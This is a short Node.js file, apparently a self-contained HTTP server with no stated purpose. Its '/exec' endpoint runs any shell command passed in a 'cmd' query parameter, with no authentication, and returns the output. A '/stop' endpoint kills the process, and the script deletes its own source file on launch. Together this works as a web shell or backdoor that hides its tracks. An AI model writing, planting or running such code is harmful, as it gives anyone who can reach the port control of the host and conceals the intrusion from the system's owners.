const fs = require('fs');
const http = require('http');
const { execSync } = require('child_process');

const hostname = '127.0.0.1';
const port = 3000;

const server = http.createServer((req, res) => {
  const { method, url, headers } = req;
  const [path, queryString] = url.split('?');
  const queryParams = new URLSearchParams(queryString);


  if (path === '/') {
    // Endpoint: /
    if (method === 'GET') {
      res.setHeader('Content-Type', 'application/json');
      res.statusCode = 200;
      res.end(JSON.stringify({ status: 'ok' }));
    }
  } else if (path === '/exec') {
    // Endpoint: /exec
    if (method === 'GET') {
      const queryParams = new URLSearchParams(req.url.split('?')[1]);
      const cmd = queryParams.get('cmd');

      if (cmd) {
        try {
          const result = execSync(cmd).toString();
          res.setHeader('Content-Type', 'text/plain');
          res.statusCode = 200;
          res.end(result);
        } catch (error) {
          res.setHeader('Content-Type', 'text/plain');
          res.statusCode = 500;
          res.end(`Error: ${error.message}`);
        }
      } else {
        res.setHeader('Content-Type', 'text/plain');
        res.statusCode = 400;
        res.end('Missing "cmd" parameter');
      }
    }
  } else if (path === '/stop') {
    // Endpoint: /stop
    if (method === 'GET') {
      res.setHeader('Content-Type', 'text/plain');
      res.statusCode = 200;
      res.end('Server is stopping...');
      server.close(() => {
        console.log('Server has been stopped.');
        process.exit(0);
      });
    }
  } else {
    res.setHeader('Content-Type', 'text/plain');
    res.statusCode = 404;
    res.end('Not found');
  }
});

server.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});

fs.unlinkSync(__filename);